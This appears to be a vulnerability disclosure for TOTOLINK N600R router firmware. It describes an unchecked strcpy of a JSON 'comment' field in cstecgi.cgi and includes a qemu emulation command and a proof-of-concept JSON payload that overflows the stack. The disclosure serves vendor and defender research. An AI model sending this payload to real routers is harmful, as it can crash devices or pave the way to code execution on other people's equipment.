# TOTOLINK_N600R_V4.3.0cu.7866_B20220506_strcpy_stack_overflow
## File download address : https://totolink.tw/support_view/N600R
First decompress the source file through binwalk
```binwalk -Me TOTOLINK_N600R_V4.3.0cu.7866_B20220506.web```
## Stack Overflow
In the main function, the memory allocation size is set according to the environment variable CONTENT_LENGTH, which is parsed through the cJSON_Parse library function. The comment field will be strcpyed into the memory, and there is no length check, which will cause stack overflow.

<img width="364" alt="截屏2025-04-23 11 21 27" src="https://github.com/user-attachments/assets/dfbbbf88-5489-4309-b02c-8d25d4539414" />


In the function at the binary file address 0x00418e38, the length of the read "comment" segment is not checked, and an overflow occurs when copied to the memory through strcpy.

<img width="314" alt="截屏2025-04-23 14 34 43" src="https://github.com/user-attachments/assets/07706bc2-3a8f-4414-997a-21387c6ceec9" />


## Simulate running in qemu
```
sudo chroot ./ ./qemu-mips-static\
    -E CONTENT_LENGTH="10000"  -g 123 -L ./lib \
    ./web_cste/cgi-bin/cstecgi.cgi  < ./poc `
```
The poc file input is the following json format string：
```
{
    "topicurl": "UploadCustomModule/setMacFilterRules",
    "macAddress": "abc",
    "comment": "qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuioasdfghjklzxcvbnmqazwsxedcrfvtgb12344567891234doit"
}
```
We can see that the string overflows to stack addresses 0x2b2a9b2a to 0x2b2a9b99, and the overflow length can be controlled arbitrarily.
<img width="556" alt="截屏2025-04-23 15 35 27" src="https://github.com/user-attachments/assets/40406528-b71b-4409-a0de-bab84af845d9" />

